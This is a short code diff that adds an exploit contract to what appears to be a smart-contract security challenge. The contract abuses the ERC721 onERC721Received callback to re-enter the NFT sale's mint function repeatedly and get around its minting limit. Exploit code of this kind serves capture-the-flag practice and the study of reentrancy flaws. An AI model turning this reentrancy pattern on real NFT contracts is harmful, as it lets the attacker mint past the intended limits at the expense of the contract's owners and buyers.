@@ -102,3 +102,27 @@ contract NftSaleChallenge {
         return token.isSolved();
     }
 }
+
+contract NftSaleChallengeExploit {
+    NftSale token;
+
+    constructor(NftSale token_) payable {
+        token = token_;
+    }
+
+    function start() public {
+        token.mint{ value: token.getNFTPrice() }(1);
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256 _tokenId,
+        bytes memory
+    ) external returns (bytes4) {
+        if (_tokenId < 31) {
+            token.mint{ value: token.getNFTPrice() }(1);
+        }
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
